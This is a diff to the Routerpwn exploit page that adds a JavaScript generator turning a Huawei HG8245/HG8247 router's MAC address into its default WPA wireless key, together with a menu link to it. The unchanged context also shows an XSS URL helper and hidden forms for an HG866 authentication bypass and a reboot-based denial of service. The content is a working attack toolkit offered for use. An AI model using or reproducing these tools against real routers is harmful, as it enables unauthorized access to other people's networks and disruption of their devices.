@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 	<head>
-		<title>Routerpwn 1.17.229</title>
+		<title>Routerpwn 1.17.230</title>
 		<link rel="apple-touch-icon" HREF="favicon.png" />
 		<link rel="shortcut icon" HREF="favicon.ico" />
 		<meta name="apple-mobile-web-app-capable" content="yes" />
@@ -236,6 +236,43 @@ function urlxss(url) {
 	url = url.replace("URLXSS", getxss());
 	document.location=url;
 }
+
+function HG824x()
+{
+    //HUAWEI HG8245/HG8247 MAC Address to WPA Key
+	MACs = prompt("MAC:");
+	MAC = MACs.split(":");
+	last=MAC[0];part1=MAC[3];part2=MAC[4];partx=MAC[5];extract=MAC[5].split("");part3=extract[0];offset=extract[1];integer=parseInt(offset,16);value=parseInt(part3,16);
+	if ( integer >= 0 && integer <= 8 ){
+		if ( value == 0 ){
+			val = "F"; 
+		}else{
+			value = value - 1; 
+		}
+	} 
+	val = value.toString(16).toUpperCase();
+	switch (offset) { 
+		case "8": part3="F"; break; case "9": part3="0"; break; case "A": part3="1"; break; case "B": part3="2"; break;
+		case "C": part3="3"; break; case "D": part3="4"; break;	case "E": part3="5"; break; case "F": part3="6"; break;
+		case "0": part3="7"; break; case "1": part3="8"; break; case "2": part3="9"; break; case "3": part3="A"; break;
+		case "4": part3="B"; break;	case "5": part3="C"; break;	case "6": part3="D"; break;	case "7": part3="E"; break;	}
+	switch (last) {
+		case "28": part4="03"; break; case "08": part4="05"; break;	case "80": part4="06"; break; case "E0": part4="0C"; break;
+		case "00": part4="0D"; break; case "10": part4="0E"; break;	case "CC": part4="12"; break; case "D4": part4="35"; break;
+		case "AC": part4="1A"; break; case "20": part4="1F"; break; case "70": part4="20"; break; case "F8": part4="21"; break;	
+		case "48": part4="24"; break; default: alert("This MAC might is not elegible for getting WPA key"); return;}
+	integer=parseInt(partx,16);	
+	if ( integer >= 0 && integer <= 8 ){
+		new_v=parseInt(part2,16);
+		new_value=new_v-1;
+		part2=new_value.toString(16).toUpperCase()
+		if ( val == 0 ){
+			val = "F"; 
+		}
+	}
+	alert("WPA Key: "+part1+part2+val+part3+part4);
+}
+
 
 function hg866pass() {
 	admin=prompt("Change administrator password:");
@@ -3324,8 +3361,12 @@ a=a+1
 <h2>Huawei</h2>
 <form name=hg866bypass action="" method=post ><input name=psw value=password hidden><input name=reenterpsw value=password hidden></form>
 <form name=hg866dos action="http://192.168.100.251/html/admin_reboot.html" method="post"></form>
-<h3><a href="javascript:img('HG866')">HG866</a>, <a href="javascript:img('EchoLife HG510')">HG510</a>, <a href="javascript:img('HG520b')">HG520b</a>, <a href="javascript:img('EchoLife HG520c')">EchoLife HG520c</a>, <a href="javascript:img('EchoLife HG530')">EchoLife HG530</a>, <a href="javascript:img('SmartAX MT880')">SmartAX MT880</a></h3>
-
+<h3><a href="javascript:img('HG8245')">HG8245</a>, <a href="javascript:img('HG8247')">HG8247</a>, <a href="javascript:img('HG866')">HG866</a>, <a href="javascript:img('EchoLife HG510')">HG510</a>, <a href="javascript:img('HG520b')">HG520b</a>, <a href="javascript:img('EchoLife HG520c')">EchoLife HG520c</a>, <a href="javascript:img('EchoLife HG530')">EchoLife HG530</a>, <a href="javascript:img('SmartAX MT880')">SmartAX MT880</a></h3>
+<article>
+	<div>05/11/15</div>
+	<div><a href="http://websec.mx/advisories/to_be_created">[+]</a></div>
+	<div><a href="javascript:HG824x()">HG8245 and HG8247 mac2wpakey default wireless key generator</a></div>
+</article>
 <article>
 	<div>06/14/12</div>
 	<div><a href="http://websec.mx/advisories/view/Evasion_de_autenticacion_en_Huawei_HG866">[+]</a></div>
